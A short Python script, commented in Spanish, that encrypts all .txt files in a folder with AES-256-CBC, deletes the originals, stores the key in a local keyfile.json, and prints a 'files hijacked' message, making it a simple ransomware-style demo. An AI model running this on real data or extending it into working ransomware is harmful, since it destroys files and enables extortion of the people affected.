#!/usr/bin/env python3
"""
Cifra todos los .txt de una carpeta con AES-256-CBC
y guarda <archivo>.enc           (IV ‖ ciphertext)
Genera un archivo keyfile.json   (clave + IV por archivo)
"""
import os, json, argparse
from pathlib import Path
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

BLOCK = 16
KEY   = get_random_bytes(32)          # 256-bit

def encrypt_file(path: Path, key: bytes) -> dict:
    iv = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    data = path.read_bytes()
    ct   = cipher.encrypt(pad(data, BLOCK))
    enc_path = path.with_suffix(path.suffix + ".enc")
    enc_path.write_bytes(iv + ct)
    path.unlink()                      # opcional: borrar original
    return {"file": enc_path.name, "iv": iv.hex()}

def main(folder):
    folder = Path(folder).resolve()
    records = {"key": KEY.hex(), "files": []}

    for txt in folder.glob("*.txt"):
        rec = encrypt_file(txt, KEY)
        records["files"].append(rec)
        print(f"[+] {txt.name} → {rec['file']}")

    (folder / "keyfile.json").write_text(json.dumps(records))
    print("\n=== ¡Archivos secuestrados! ===")
    print("Guarda keyfile.json en lugar seguro.")

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("folder", help="Carpeta con .txt a cifrar")
    main(ap.parse_args().folder)
